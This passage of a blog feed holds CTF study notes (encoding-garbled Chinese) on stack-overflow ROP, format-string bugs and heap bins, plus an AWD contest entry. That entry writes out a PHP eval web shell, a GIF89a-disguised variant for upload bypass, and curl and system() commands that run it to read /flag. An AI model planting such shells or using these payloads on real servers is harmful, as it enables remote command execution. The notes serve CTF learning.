64æ˜¯å¯„å­˜å™¨è°ƒç”¨</p><p>system(â€œ&#x2F;bin&#x2F;shâ€)   &#x2F;bin&#x2F;shæ˜¯å­˜æ”¾åˆ°rodataåœ°æ–¹</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817211753.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817212348.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817212234.png" alt="image.png"></p><p>-fno-stack</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">å…³é—­ä¿æŠ¤ canary fno-stack-protector ï¼Ÿï¼Ÿï¼Ÿ<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817212726.png" alt="image.png"></p><p>nopä½¿å¾—ASLRæ‰“å¼€ä¹‹åæ ˆæº¢å‡ºæ‰§è¡Œæˆä¸ºå¯èƒ½</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817214704.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817214722.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817215102.png" alt="image.png"><br>ä¸Šå›¾çš„ebpæ˜¯systemå‡½æ•°è‡ªå·±pushè¿›å»çš„</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817221409.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817221553.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817222300.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817222329.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817222944.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817222441.png" alt="image.png"></p><p>ä¸‹é¢ä¸ºï¼šåªæœ‰systemå‡½æ•°ï¼Œæ²¡æœ‰&#x2F;bin&#x2F;shå­—ç¬¦ä¸²</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817230223.png" alt="image.png"></p><h3 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h3><p>é™¤äº†ç»™å¯æ‰§è¡Œæ–‡ä»¶ï¼Œè¿˜ç»™äº†libc.so</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817231857.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817232013.png" alt="image.png"><br>fflush()æ¸…ç†ç¼“å†²åŒº<br>read(0, &amp;buf, 0xAu)   0è¡¨ç¤ºæ ‡å‡†è¾“å…¥</p><h2 id="day5"><a href="#day5" class="headerlink" title="day5"></a>day5</h2><p>ret2text  ä»£ç ä¸­æ²¡æœ‰åé—¨å‡½æ•°<br>ret2shellcode  checksecçœ‹æ²¡æœ‰RWEç›¸å…³çš„ä¸œè¥¿<br>ret2libc1 æ—¢æœ‰systemï¼Œåˆæœ‰ &#x2F;bin&#x2F;sh<br>ret2libc2 åªæœ‰system   è‡ªå·±è¾“å…¥&#x2F;bin&#x2F;sh<br>ret2libc3  è¿˜ç»™äº†ä¸€ä¸ªlibc.soæ–‡ä»¶</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818223114.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818223647.png" alt="image.png"></p><p>æ³„éœ²gotè¡¨ä¸­putå‡½æ•°çš„åœ°å€ï¼Œä»libcä¸­æ‰¾åˆ°putså‡½æ•°å’Œsystemå‡½æ•°çš„è·ç¦»ï¼Œå°±å¯ä»¥ç®—å‡ºsystemå‡½æ•°çš„åœ°å€äº†</p><p>æ³„éœ²gotè¡¨ä¸­putå‡½æ•°çš„åœ°å€æ–¹æ³•ï¼š</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818224227.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818224333.png" alt="image.png"></p><p>æ‰“å°äº†å¥½å¤šä¸œè¥¿ï¼Œè¿™äº›ä¸œè¥¿æ˜¯putå‡½æ•°æ‰§è¡Œçš„ï¼Œæ‰€ä»¥putå‡½æ•°å·²ç»æ‰§è¡Œè¿‡äº†ï¼Œgotè¡¨é‡Œé¢å°±æœ‰å€¼äº†</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818224614.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818225432.png" alt="image.png"></p><p>idaä¸­æ‰¾ä¸åˆ°&#x2F;bin&#x2F;shå’Œshï¼Œå¯ä»¥ç”¨stringsæ‰¾ä¸ªå«æœ‰shçš„å­—ç¬¦ä¸²</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818230016.png" alt="image.png"></p><p>æ•´ä½“çš„æ”»å‡»è„šæœ¬ï¼š<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818230201.png" alt="image.png"></p><p>sendlineafter  å½“æ”¶åˆ°ç¬¬ä¸€ä¸ªå‚æ•°ä¹‹åï¼Œå°±å‘é€ç¬¬äºŒä¸ªå‚æ•°+&#x2F;nè¾“å‡º</p><p>cyclicæ˜¯ç”¨æ¥å¡«å……åƒåœ¾æ•°æ®çš„</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818231237.png" alt="image.png"></p><h3 id="è¯¾åé¢˜1ï¼šret2text"><a href="#è¯¾åé¢˜1ï¼šret2text" class="headerlink" title="è¯¾åé¢˜1ï¼šret2text"></a>è¯¾åé¢˜1ï¼šret2text</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818232343.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818232502.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818232528.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818232553.png" alt="image.png"></p><h3 id="è¯¾åé¢˜2ï¼šret2shellcode"><a href="#è¯¾åé¢˜2ï¼šret2shellcode" class="headerlink" title="è¯¾åé¢˜2ï¼šret2shellcode"></a>è¯¾åé¢˜2ï¼šret2shellcode</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818233129.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818233201.png" alt="image.png"><br>ASLRï¼Œä¸çŸ¥é“å†™åˆ°æ ˆä¸Šçš„åœ°å€æ˜¯ä»€ä¹ˆï¼Ÿæ‰€ä»¥é¢˜ç›®å°±å‘Šè¯‰äº†</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818233457.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818233544.png" alt="image.png"></p><p>nop</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818233733.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818233756.png" alt="image.png"></p><p>asmæ˜¯æŠŠæ±‡ç¼–ä»£ç å˜æˆæœºå™¨ç </p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818233930.png" alt="image.png"></p><h3 id="è¯¾åé¢˜3ï¼šret2libc-systemæœ‰-x2F-bin-x2F-shä¹Ÿæœ‰"><a href="#è¯¾åé¢˜3ï¼šret2libc-systemæœ‰-x2F-bin-x2F-shä¹Ÿæœ‰" class="headerlink" title="è¯¾åé¢˜3ï¼šret2libc  systemæœ‰ &#x2F;bin&#x2F;shä¹Ÿæœ‰"></a>è¯¾åé¢˜3ï¼šret2libc  systemæœ‰ &#x2F;bin&#x2F;shä¹Ÿæœ‰</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818234215.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818234115.png" alt="image.png"></p><p>æœ‰äº†systemï¼Œåœ¨pltè¡¨é‡Œé¢æœ‰ä¸ªè¡¨é¡¹ç›®</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818234143.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818234227.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818234418.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818234442.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818234646.png" alt="image.png"></p><p>daedbeefæ˜¯åƒåœ¾æ•°æ®</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818234757.png" alt="image.png"></p><h3 id="è¯¾åé¢˜4ï¼šx64"><a href="#è¯¾åé¢˜4ï¼šx64" class="headerlink" title="è¯¾åé¢˜4ï¼šx64"></a>è¯¾åé¢˜4ï¼šx64</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818235157.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818235814.png" alt="image.png"></p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">ROPgadget</span> <span class="hljs-built_in">--binary</span> æ–‡ä»¶å <span class="hljs-built_in">--only</span> <span class="hljs-string">&quot;pop|ret&quot;</span> | <span class="hljs-string">grep</span> <span class="hljs-string">rsi</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819000233.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819000402.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819000714.png" alt="image.png"></p><p>return å°†æ ˆé¡¶çš„å€¼æŒ‡å‘rip    </p><p>ripï¼špop_rdi_ret</p><p>rdiï¼š &#x2F;bin&#x2F;sh<br>rip: system</p><p>systemå–rdiä¸­çš„å‚æ•°ï¼Œæ‰§è¡Œsystem(â€œ&#x2F;bin&#x2F;shâ€)</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819001126.png" alt="image.png"><br>éƒ½æ˜¯å…ˆä¼ å‚ï¼Œå†è°ƒç”¨å‡½æ•°</p><h3 id="64ä½ROPå°æŠ€å·§-csu-ä¸æ˜¯ä¸€ä¸ªå®Œæ•´çš„æ”»å‡»ï¼Œåªæ˜¯ROPä¸­é—´çš„ä¸€ä¸ªæŠ€å·§"><a href="#64ä½ROPå°æŠ€å·§-csu-ä¸æ˜¯ä¸€ä¸ªå®Œæ•´çš„æ”»å‡»ï¼Œåªæ˜¯ROPä¸­é—´çš„ä¸€ä¸ªæŠ€å·§" class="headerlink" title="64ä½ROPå°æŠ€å·§ csu(ä¸æ˜¯ä¸€ä¸ªå®Œæ•´çš„æ”»å‡»ï¼Œåªæ˜¯ROPä¸­é—´çš„ä¸€ä¸ªæŠ€å·§)"></a>64ä½ROPå°æŠ€å·§ csu(ä¸æ˜¯ä¸€ä¸ªå®Œæ•´çš„æ”»å‡»ï¼Œåªæ˜¯ROPä¸­é—´çš„ä¸€ä¸ªæŠ€å·§)</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819004149.png" alt="image.png"></p><p>jz zæ˜¯1å°±jump zæ˜¯0å°±å‘ä¸‹æ‰§è¡Œ</p><h3 id="è¯¾åé¢˜5ï¼š"><a href="#è¯¾åé¢˜5ï¼š" class="headerlink" title="è¯¾åé¢˜5ï¼š"></a>è¯¾åé¢˜5ï¼š</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819002213.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819002310.png" alt="image.png"></p><p>æ²¡æœ‰system<br>1ï¼‰æ‰¾åˆ°libcçš„çœŸå®åœ°å€  ä¹‹å‰é‚£ä¸ªé¢˜æ˜¯é¢˜ç›®ç»™æä¾›äº†ä¸€ä¸ªå‡½æ•°ï¼Œç„¶åç»™æ‰“å°å‡ºæ¥äº†</p><p>æ²¡æœ‰&#x2F;bin&#x2F;sh<br>1ï¼‰æœ‰æ²¡æœ‰å…¶ä»–ç¬¦å·æœ«å°¾æœ‰shï¼Œå¯ä»¥è°ƒç”¨<br>2ï¼‰ç”¨ropå°†&#x2F;bin&#x2F;shè¯»å…¥ç¼“å†²åŒºï¼Œè€Œä¸”åœ°å€æ˜¯å›ºå®šçš„ï¼Œä¾‹å¦‚bss<br>3ï¼‰æ³„éœ²äº†libcçš„åœ°å€ï¼Œå¯ä»¥ç”¨libcé‡Œé¢çš„ä»»ä½•ä¸œè¥¿</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819002528.png" alt="image.png"></p><p>æœ‰shï¼Œä¸ä¸€å®šæ˜¯å¯ç”¨çš„</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819002621.png" alt="image.png"></p><p>libcé‡Œé¢æœ‰&#x2F;bin&#x2F;shï¼Œå¯ä»¥ç”¨çš„<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819002755.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819003118.png" alt="image.png"></p><p>ä½†æ˜¯æœ‰writeå‡½æ•°</p><h2 id="day6"><a href="#day6" class="headerlink" title="day6"></a>day6</h2><h3 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²</h3><p>å­—ç¬¦ä¸²æˆªæ–­</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">hello world\x00password<br>hello world\x41password<br><br><span class="hljs-function"><span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-string">&quot;%p&quot;</span>, <span class="hljs-string">&quot;Hello world&quot;</span>)</span></span><br></code></pre></td></tr></table></figure><p>é€šè¿‡%pæ³„éœ²å‡ºcanaryï¼Œæ„é€ expçš„æ—¶å€™å†å¡«å›å»</p><p>%pæ˜¯æŠŠæ ˆä¸Šçš„å€¼ç›´æ¥æ‰“å°å‡ºæ¥<br>%sæ˜¯æŠŠæ ˆä¸Šçš„å€¼å½“æˆä¸€ä¸ªåœ°å€ï¼ŒæŠŠè¿™ä¸ªåœ°å€æŒ‡å‘çš„å†…å®¹æ‰“å°å‡ºæ¥</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819220435.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819220558.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819221142.png" alt="image.png"></p><p>å–ç¬¬3ä¸ªå‚æ•°</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819221419.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819222301.png" alt="image.png"></p><p>%n ä»»æ„åœ°å€å†™</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819225155.png" alt="image.png"></p><p>%hhn ä¸€ä¸ªå­—èŠ‚<br>%hn  ä¸¤ä¸ªå­—èŠ‚<br>%n     å››ä¸ªå­—èŠ‚</p><h3 id="ä¾‹é¢˜1"><a href="#ä¾‹é¢˜1" class="headerlink" title="ä¾‹é¢˜1"></a>ä¾‹é¢˜1</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819225818.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819230100.png" alt="image.png"></p><h3 id="ç»ƒä¹ é¢˜2"><a href="#ç»ƒä¹ é¢˜2" class="headerlink" title="ç»ƒä¹ é¢˜2"></a>ç»ƒä¹ é¢˜2</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819231108.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819231119.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819231422.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819232013.png" alt="image.png"></p><p>64ä½ å‰6ä½å‚æ•°å­˜åˆ°äº†å¯„å­˜å™¨ä¸­</p><h3 id="å †"><a href="#å †" class="headerlink" title="å †"></a>å †</h3><p>mmap  memory map</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819234617.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819235616.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230820000051.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230820000118.png" alt="image.png"></p><h2 id="day1-1"><a href="#day1-1" class="headerlink" title="day1"></a>day1</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821210735.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821214659.png" alt="image.png"></p><p>0x8 0x10 0x18 0x20</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821213742.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821214010.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">p ptr<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821214444.png" alt="image.png"></p><p>previous sizeå¤ç”¨<br>å› ä¸ºprevious sizeè¡¨ç¤ºä¸Šä¸€ä¸ªchunkæ˜¯free chunkçš„sizeå¤§å°ï¼Œæ­¤æ—¶ä¸Šä¸€ä¸ªchunkä¸æ˜¯free chunkï¼Œæ‰€ä»¥è¿™ä¸ªprevious sizeå°±æ²¡ç”¨äº†</p><p>fashbinä¸­çš„sizeï¼Œå³ä½¿freeæ‰ï¼Œæœ€åä¸€ä½ä¹Ÿè¿˜æ˜¯1</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821215503.png" alt="image.png"></p><p>ç‰©ç†é“¾è¡¨ï¼šçœ‹ä¸Šä¸€ä¸ªchunkæ˜¯ä¸æ˜¯ç©ºé—²ï¼Œç„¶ååˆå¹¶<br>é€»è¾‘é“¾è¡¨ï¼šå¦‚ä¸‹å›¾</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821220136.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821220442.png" alt="image.png"></p><h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><p>åªæœ‰fastbinå’Œï¼Ÿæ˜¯å•å‘çš„ï¼Œå…¶ä»–çš„binéƒ½æ˜¯åŒå‘çš„</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821221907.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821222905.png" alt="image.png"><br>how2heap</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821231355.png" alt="image.png"></p><p>gdb6433</p><h1 id="day2-1"><a href="#day2-1" class="headerlink" title="day2"></a>day2</h1><p>unsorted binç»å¤§å¤šæ•°æ˜¯ä¸ºäº†fastbinåˆ›é€ æ¡ä»¶çš„<br>unsorted bin åŒå‘é“¾è¡¨<br>house of xxx ä¸€èˆ¬æ˜¯å¤šä¸ªæ¼æ´çš„ç»“åˆ</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822205923.png" alt="image.png"></p><p>fsb Â - format string bug æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p><h3 id="ç»ƒä¹ é¢˜"><a href="#ç»ƒä¹ é¢˜" class="headerlink" title="ç»ƒä¹ é¢˜"></a>ç»ƒä¹ é¢˜</h3><p>æœ€ç®€å•ã€æœ€æ¨¡æ¿åŒ–çš„å †é¢˜ç›®</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822214000.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822214131.png" alt="image.png"></p><p>å»é™¤äº†ç¬¦å·è¡¨</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822215801.png" alt="image.png"></p><p>fastbin åè¿›å…ˆå‡º</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822221103.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822221922.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822223454.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822223118.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/f2def47484f422d3854051967a63483.png" alt="f2def47484f422d3854051967a63483.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822222816.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822222459.png" alt="image.png"></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€awdã€‘å·¥å…·åŠæ–¹æ³•è®°å½•</title>
    <link href="/2023/08/13/ctf/unsupported/%E3%80%90awd%E3%80%91%E5%B7%A5%E5%85%B7%E5%8F%8A%E6%96%B9%E6%B3%95%E8%AE%B0%E5%BD%95/"/>
    <url>/2023/08/13/ctf/unsupported/%E3%80%90awd%E3%80%91%E5%B7%A5%E5%85%B7%E5%8F%8A%E6%96%B9%E6%B3%95%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p>æ‰¾ip  æå‰å†™å¥½è„šæœ¬ï¼Œè·‘è„šæœ¬</p><p>nmapæ‰«äº†ä¸€ä¸‹åœ°å€ï¼Œå‘ç°httpæœ‰å‡ ä¸ªæ˜¯adminï¼Œçœ‹äº†ç›¸å…³æ–‡ä»¶å¤¹ï¼Œè¿˜æœ‰ä¸€ä¸ªgit</p><p>æ€ä¹ˆåŠ å›ºï¼Ÿ<br>å¾—æ‹–åˆ°æœ¬åœ°å®¡è®¡</p><p>ç›´æ¥åœ¨ç®¡ç†å‘˜åå°å…³æ‰äº† åœ¨ç®¡ç†å‘˜é¡µé¢ç›´æ¥å…³äº†</p><p>æ•°æ®åº“<br>é…ç½®æ–‡ä»¶ cms 123456 mysql_config.php<br>config.php</p><h1 id="awd-3"><a href="#awd-3" class="headerlink" title="awd 3"></a>awd 3</h1><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"># nmap -v -<span class="hljs-keyword">A</span> <span class="hljs-number">192.168.20.201</span><br></code></pre></td></tr></table></figure><h1 id="æ—¥å¸¸è®°å½•"><a href="#æ—¥å¸¸è®°å½•" class="headerlink" title="æ—¥å¸¸è®°å½•"></a>æ—¥å¸¸è®°å½•</h1><h2 id="hackbaræ‰§è¡Œwindowsä¸‹çš„å¯†ç å‡½æ•°ï¼Œpostæ•°æ®ä¼ é€’"><a href="#hackbaræ‰§è¡Œwindowsä¸‹çš„å¯†ç å‡½æ•°ï¼Œpostæ•°æ®ä¼ é€’" class="headerlink" title="hackbaræ‰§è¡Œwindowsä¸‹çš„å¯†ç å‡½æ•°ï¼Œpostæ•°æ®ä¼ é€’"></a>hackbaræ‰§è¡Œwindowsä¸‹çš„å¯†ç å‡½æ•°ï¼Œpostæ•°æ®ä¼ é€’</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># æœ¨é©¬å‡½æ•°</span><br><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]) <span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment"># hackbaråˆ©ç”¨å‡½æ•° windows</span><br>cmd=<span class="hljs-title function_ invoke__">system</span>(dir);<br>cmd=<span class="hljs-title function_ invoke__">system</span>(ipconfig);<br><br><span class="hljs-comment"># hackbaråˆ©ç”¨å‡½æ•° linux</span><br>cmd=<span class="hljs-title function_ invoke__">system</span>(ls);<br>cmd=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ls -l&quot;</span>);<br>cmd=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat /flag&quot;</span>);<br><span class="hljs-comment"># curlåˆ©ç”¨</span><br>curl http:<span class="hljs-comment">//xxx/admin/images/yjh.php -XPOST -H &#x27;Content-type: application/x-www-form-urlencoded&#x27; -d&quot;123=system(&#x27;cat /flag&#x27;);&quot;</span><br><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># æœ¨é©¬å‡½æ•°</span><br>GIF89a<span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]) <span class="hljs-meta">?&gt;</span><br><br>ç›´æ¥åˆ©ç”¨å°±å¯ä»¥<br></code></pre></td></tr></table></figure><h2 id="å­—ç¬¦è½¬æ¢"><a href="#å­—ç¬¦è½¬æ¢" class="headerlink" title="å­—ç¬¦è½¬æ¢"></a>å­—ç¬¦è½¬æ¢</h2><p>crlf -&gt; lf</p><h2 id="æ‰¾ç»„å§”ä¼š"><a href="#æ‰¾ç»„å§”ä¼š" class="headerlink" title="æ‰¾ç»„å§”ä¼š"></a>æ‰¾ç»„å§”ä¼š</h2><p>phpèƒ½ä¸èƒ½é‡å¯<br>watchbirdèƒ½ä¸èƒ½ç”¨</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€è™šæ‹Ÿæœºã€‘(202308) hypervä¸­çš„kaliè™šæ‹ŸæœºåŒç½‘å¡è®¾ç½®</title>
    <link href="/2023/08/13/net/%E3%80%90%E8%99%9A%E6%8B%9F%E6%9C%BA%E3%80%91(202308)%20hyperv%E4%B8%AD%E7%9A%84kali%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%8F%8C%E7%BD%91%E5%8D%A1%E8%AE%BE%E7%BD%AE/"/>
    <url>/2023/08/13/net/%E3%80%90%E8%99%9A%E6%8B%9F%E6%9C%BA%E3%80%91(202308)%20hyperv%E4%B8%AD%E7%9A%84kali%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%8F%8C%E7%BD%91%E5%8D%A1%E8%AE%BE%E7%BD%AE/</url>
    
